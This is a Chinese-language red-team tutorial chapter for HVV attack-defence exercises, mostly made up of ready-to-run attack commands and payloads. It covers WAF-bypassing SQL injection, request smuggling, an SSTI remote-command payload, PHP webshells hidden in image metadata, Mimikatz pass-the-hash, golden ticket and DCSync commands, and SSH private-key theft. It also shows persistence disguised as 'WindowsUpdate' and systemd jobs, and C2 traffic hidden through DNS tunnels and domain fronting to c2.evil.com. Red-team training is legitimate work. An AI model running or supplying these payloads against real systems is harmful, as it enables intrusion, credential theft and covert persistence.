# HVV 红队攻击技术实战

## 概述

红蓝对抗（HVV）是国内最大规模的真实网络攻防演练。本章聚焦红队视角的实战攻击技术——从信息收集到横向移动的完整攻击链。

---

## 1. 信息收集阶段

### 1.1 自动化目标测绘

```bash
# 子域名枚举（多源融合）
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass_subs.txt
# 合并去重
cat subs.txt amass_subs.txt | sort -u | httpx -o live.txt

# 全端口扫描
masscan -p1-65535 --rate=1600 -iL live.txt -oJ masscan.json

# 服务指纹
nmap -sV -sC -p $(jq -r '.[].ports[].port' masscan.json | tr '\n' ',') \
  -iL live.txt -oA nmap_scan

# 截图验证（发现后台管理/登录页）
gowitness file -f live.txt --no-http
```

### 1.2 暴露面发现（搜索引擎联动）

```bash
# FOFA（国内搜索引擎）
# 语法: app="SpringBoot" && country="CN"
curl "https://fofa.info/api/v1/search/all?key=${FOFA_KEY}&qbase64=$(echo 'host="*.target.com"' | base64)"

# Shodan CLI
shodan search "org:Target Corp" --fields ip_str,port,org,hostnames

# Censys（证书透明日志 + 资产关联）
censys search "services.tls.certificates.leaf_data.subject.organization: Target Corp"
```

---

## 2. 漏洞利用阶段

### 2.1 Web 应用突破

```bash
# SQL 注入绕过 WAF
# 内联注释 + 空白字符变体
GET /api/users?id=1/**/UNION/**/SELECT/**/1,2,3

# HTTP 参数污染
GET /search?q=admin&q=' OR 1=1 --

# 请求走私绕过
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

# SSTI（模板注入）
{{7*7}}                     # Jinja2 探测
${7*7}                      # Freemarker 探测
<%= 7*7 %>                  # ERB 探测
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# 文件上传绕过
# 双扩展名: shell.php.jpg
# Content-Type 伪造: image/jpeg
# 图片马: exiftool -Comment='<?php system($_GET["cmd"]); ?>' img.jpg
```

### 2.2 中间件漏洞速查

```yaml
HVV 高频目标中间件及利用:

  Shiro (Java):
    漏洞: Shiro-550/721 (RememberMe 反序列化)
    探测: Cookie 中有 rememberMe=deleteMe
    工具: shiro_attack.jar / ysoserial

  Fastjson:
    漏洞: 各版本反序列化 <1.2.83
    探测: {"@type":"java.net.Inet4Address","val":"dnslog.cn"}
    利用: JNDI 注入 + LDAP 回连

  Struts2:
    漏洞: S2-001 ~ S2-062
    探测: action 后缀 + OGNL 注入
    工具: Struts2-Scan

  Weblogic:
    漏洞: CVE-2020-14882（未授权访问）
    探测: /console 路径 + 版本识别
    利用: 管理员控制台 + 部署 war 包

  Spring:
    漏洞: Spring4Shell (CVE-2022-22965)
    探测: Spring Boot Actuator 端点泄露
    利用: /jolokia + ClassLoader 加载
```

---

## 3. 横向移动

### 3.1 Windows 内网横向

```powershell
# Pass-the-Hash (PtH)
# Mimikatz 提取 Hash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# 使用 Hash 直接认证
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:aad3b435b51404eeaad3b435b51404ee" exit

# WMI 横向
wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee CORP/Administrator@192.168.1.100

# PSExec
psexec.py CORP/Administrator@192.168.1.100 -hashes :aad3b435b51404eeaad3b435b51404ee

# Kerberos 票据攻击
# 黄金票据 (伪造 KRBTGT)
mimikatz.exe "kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /krbtgt:HASH /user:Administrator /id:500 /ptt" exit

# 白银票据 (伪造服务票据)
mimikatz.exe "kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /target:SERVER.corp.local /service:cifs /rc4:HASH /user:Administrator /ptt" exit

# DCSync（模拟域控同步密码）
mimikatz.exe "lsadump::dcsync /domain:CORP.LOCAL /user:krbtgt" exit
```

### 3.2 Linux 内网横向

```bash
# SSH 密钥劫持
cat ~/.ssh/id_rsa | base64   # 导出私钥
echo "pubkey" >> ~/.ssh/authorized_keys  # 植入公钥

# SSH Agent 劫持
SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.12345 ssh user@target

# Ansible/ Salt 劫持
# 查找 Ansible 主机清单
find / -name "hosts" -path "*/ansible/*" 2>/dev/null
# Ansible vault 密码文件
find / -name "*.vault_pass*" 2>/dev/null
```

---

## 4. 权限维持技巧

### 4.1 高级持久化

```bash
# Windows 计划任务（隐藏）
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM /f

# Linux Crontab（伪装）
echo "*/10 * * * * root /usr/lib/systemd/systemd-update >/dev/null 2>&1" >> /etc/crontab

# Java 内存马（无文件落地）
# Tomcat Filter 内存马
# Spring Interceptor 内存马
# 检测: 无磁盘文件，进程内存中

# Image 隐写 Webshell
exiftool -Comment='<?php @eval($_POST["cmd"]);?>' logo.png
mv logo.png logo.php.png
```

### 4.2 C2 通信隐藏

```bash
# DNS Beacon（绕过出口防火墙）
# 数据编码在 DNS TXT 查询中
dig @c2-server.com TXT aabbcc.c2.example.com

# DoH 隧道（DNS over HTTPS）
# 数据隐藏在 HTTPS DNS 查询中
curl -H "accept: application/dns-json" \
  "https://cloudflare-dns.com/dns-query?name=aabbcc.c2.example.com&type=TXT"

# 域前置（绕过域名黑名单）
# 对 CDN 来说 SNI 是合法域名，内部路由到 C2
curl -H "Host: c2.evil.com" https://cdn.trusted-site.com/beacon
```

---

## 5. 红队工具链

| 阶段 | 工具 | 用途 |
|------|------|------|
| 侦察 | Amass/Subfinder/Masscan | 资产发现 |
| 扫描 | Nuclei/Xray/Burp | 漏洞扫描 |
| 利用 | Metasploit/Cobalt Strike | 漏洞利用 |
| 提权 | WinPEAS/LinPEAS/Mimikatz | 权限分析 |
| 横向 | Impacket/CrackMapExec | 横向移动 |
| 持久化 | Covenant/Sliver | C2与持久化 |

---

## 参考资源

- [MITRE ATT&CK](https://attack.mitre.org/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

*上一篇：[HVV 实战概述](01-red-blue-team.md)*
